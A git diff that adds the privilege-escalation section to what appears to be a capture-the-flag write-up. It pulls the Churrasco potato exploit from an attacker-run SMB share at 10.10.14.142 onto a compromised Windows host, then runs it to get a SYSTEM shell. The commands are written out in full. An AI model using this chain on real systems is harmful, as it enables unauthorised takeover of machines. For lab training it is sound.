@@ -126,7 +126,40 @@ We got a shell as ```nt authority\network service```. Lets go ahead and escalate
 
 # Privilege Escalation
 
+Running the ```whoami /priv``` command
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7da53b57-00cb-4f45-9252-2ca1f64aa520)
+
+As we can see ```SeImpersonatePrivilege``` is enabaled, so this may be vulnerable to a potato exploit.
+
+We can try [churrasco](https://github.com/Re4son/Churrasco/blob/master/churrasco.exe) here
+
+We'll  be transferring that to the target machine, now ```certutil``` and ```curl``` doesn't work on the target machine. This means we'll be sending the file over to the target using smb
+
+Run this command in the directory where you downloaded the file
+
+command:```smbserver.py share .```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3dfc98ea-9007-41de-9165-a04fa37ef439)
+
+On the target machine,
+
+command:```copy \\10.10.14.142\share\churrasco.exe potato.exe```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/49bfec61-3a3d-4677-9ed1-d82bd2391f95)
+
+Now that we've successfully transferred the executable, lets run it
+
+command:```potato.exe -d "cmd.exe"```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ff84d8d1-8e83-4dbc-adcc-5607fd09bb65)
+
+We have successfully escalated our privileges, which means we have successfully pwned this box😎
+
+
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
